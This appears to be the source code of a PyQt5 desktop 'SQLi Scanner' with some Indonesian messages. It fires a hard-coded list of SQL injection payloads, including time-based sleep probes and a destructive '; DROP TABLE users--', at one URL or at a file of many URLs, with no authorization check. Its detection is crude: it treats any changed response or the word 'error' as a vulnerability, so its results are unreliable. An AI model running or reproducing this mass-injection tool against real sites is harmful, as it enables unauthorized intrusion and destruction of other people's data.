import requests
import time
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QGroupBox, QProgressBar, QFileDialog, QRadioButton, QScrollArea, QMessageBox

class SQLiScannerThread(QThread):
    progress = pyqtSignal(int)
    result = pyqtSignal(dict)
    finished = pyqtSignal()

    def __init__(self, urls, payloads):
        super().__init__()
        self.urls = urls
        self.payloads = payloads

    def run(self):
        results = {}
        for i, url in enumerate(self.urls):
            try:
                result = self.scan_url(url)
                if result:  # Only add if there is a vulnerability detected
                    results[url] = result
            except Exception as e:
                results[url] = {"error": str(e)}

            # Update progress
            self.progress.emit(int((i + 1) / len(self.urls) * 100))

        if not results:
            self.result.emit({"message": "Kemungkinan tidak ada URL yang rentan."})
        else:
            self.result.emit(results)
        self.finished.emit()

    def scan_url(self, url):
        results = []
        try:
            # Get the original response for comparison
            original_response = requests.get(url, timeout=10, allow_redirects=False)
            original_html = original_response.text
            original_status = original_response.status_code

            for payload in self.payloads:
                try:
                    # Inject payload into the URL
                    full_url = f"{url}{payload}"
                    response = requests.get(full_url, timeout=10, allow_redirects=False)

                    # Check for redirection or difference in response HTML
                    if response.status_code != original_status or response.text != original_html:
                        results.append({
                            "url": full_url,
                            "payload": payload,
                            "vulnerable": True,
                            "analysis": "Response HTML or status differs from the original"
                        })

                    # Check for time-based SQLi
                    blind_payload = f"{url}' AND sleep(5)--"
                    blind_start = time.time()
                    blind_response = requests.get(blind_payload, timeout=15, allow_redirects=False)
                    blind_duration = time.time() - blind_start

                    if blind_duration > 5:  # Indicating a time-based SQL injection
                        results.append({
                            "url": blind_payload,
                            "payload": "' AND sleep(5)--",
                            "vulnerable": True,
                            "analysis": "Time-based delay detected"
                        })

                    # Check for typical error messages
                    if "error" in response.text.lower() or "warning" in response.text.lower():
                        results.append({
                            "url": full_url,
                            "payload": payload,
                            "vulnerable": True,
                            "analysis": "SQL error detected in response"
                        })

                except requests.exceptions.RequestException as e:
                    results.append({"url": url, "payload": payload, "error": str(e)})

        except requests.exceptions.RequestException as e:
            results.append({"url": url, "error": str(e)})

        # Return results if there are vulnerabilities
        return results if results else None

class SQLiScanner(QWidget):
    def __init__(self, theme, parent=None):
        super().__init__(parent)
        self.theme = theme
        self.payloads = [
            "' OR 1=1--", "' UNION SELECT null,null--", "' AND 1=2--",
            "; DROP TABLE users--", "admin' --", "' AND sleep(5)--",
            "' AND sleep(3)--", "' OR sleep(3)--", "' UNION SELECT 1,2,sleep(3)--",
            "' AND 1=2 UNION SELECT sleep(3)--", "' OR pg_sleep(3)--"
        ]
        self.init_ui()
        self.apply_theme()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setSpacing(15)

        mode_group = QGroupBox("Select Mode")
        mode_layout = QHBoxLayout()

        self.single_mode_radio = QRadioButton("Single")
        self.mass_mode_radio = QRadioButton("Mass")
        self.single_mode_radio.setChecked(True)

        mode_layout.addWidget(self.single_mode_radio)
        mode_layout.addWidget(self.mass_mode_radio)
        mode_group.setLayout(mode_layout)
        layout.addWidget(mode_group)

        input_group = QGroupBox("Input")
        input_layout = QVBoxLayout()

        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter URL (Single mode)")
        self.file_button = QPushButton("Choose File (Mass mode)")
        self.file_button.setEnabled(False)
        self.file_button.clicked.connect(self.choose_file)

        input_layout.addWidget(self.url_input)
        input_layout.addWidget(self.file_button)
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)

        self.scan_button = QPushButton("Scan")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)

        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()

        self.results_label = QLabel()
        self.results_label.setTextInteractionFlags(Qt.TextSelectableByMouse)
        self.results_label.setWordWrap(True)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setWidget(self.results_label)
        scroll_area.setMinimumHeight(400)
        results_layout.addWidget(scroll_area)

        results_group.setLayout(results_layout)
        layout.addWidget(results_group)

        self.setLayout(layout)

        self.single_mode_radio.toggled.connect(self.toggle_mode)

    def apply_theme(self):
        self.setStyleSheet(f"""
            QWidget {{
                background-color: {self.theme['background']};
                color: {self.theme['text']};
            }}
            QPushButton {{
                background-color: {self.theme['content_background']};
                border: 1px solid {self.theme['border']};
                border-radius: 4px;
                padding: 8px;
                color: {self.theme['text']};
            }}
            QPushButton:hover {{
                background-color: {self.theme['button_hover']};
            }}
        """)

    def toggle_mode(self):
        if self.single_mode_radio.isChecked():
            self.url_input.setEnabled(True)
            self.file_button.setEnabled(False)
        else:
            self.url_input.setEnabled(False)
            self.file_button.setEnabled(True)

    def choose_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Choose File", "", "Text Files (*.txt)")
        if file_path:
            self.url_input.setText(file_path)

    def start_scan(self):
        if self.single_mode_radio.isChecked():
            urls = [self.url_input.text().strip()]
        else:
            file_path = self.url_input.text().strip()
            try:
                with open(file_path, 'r') as file:
                    urls = [line.strip() for line in file if line.strip()]
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read file: {e}")
                return

        if not urls:
            QMessageBox.warning(self, "Error", "Please provide at least one URL.")
            return

        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.results_label.setText("Scanning...\n\nFitur ini sedang dalam pengembangan. Hasil mungkin tidak sepenuhnya akurat. Kami akan terus memperbaikinya!")
        self.scan_button.setEnabled(False)

        self.scanner_thread = SQLiScannerThread(urls, self.payloads)
        self.scanner_thread.progress.connect(self.update_progress)
        self.scanner_thread.result.connect(self.display_results)
        self.scanner_thread.finished.connect(self.scan_complete)
        self.scanner_thread.start()

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def display_results(self, results):
        if "message" in results:
            self.results_label.setText(results["message"])
        else:
            formatted_results = ""
            for url, result in results.items():
                formatted_results += f"URL: {url}\n"
                for entry in result:
                    if "error" in entry:
                        formatted_results += f"Error: {entry['error']}\n"
                    elif "vulnerable" in entry:
                        formatted_results += f"Payload: {entry['payload']}\n"
                        formatted_results += f"Vulnerable: {'Yes' if entry['vulnerable'] else 'No'}\n"
                        if "analysis" in entry:
                            formatted_results += f"Analysis: {entry['analysis']}\n"
                formatted_results += "\n"

            self.results_label.setText(formatted_results)

    def scan_complete(self):
        self.scan_button.setEnabled(True)
        self.progress_bar.setVisible(False)

if __name__ == "__main__":
    theme = {
        "background": "#2E3440",
        "text": "#D8DEE9",
        "content_background": "#4C566A",
        "border": "#434C5E",
        "button_hover": "#5E81AC"
    }

    app = QApplication([])
    scanner = SQLiScanner(theme)
    scanner.setWindowTitle("SQLi Scanner")
    scanner.resize(800, 600)
    scanner.show()

    app.exec_()
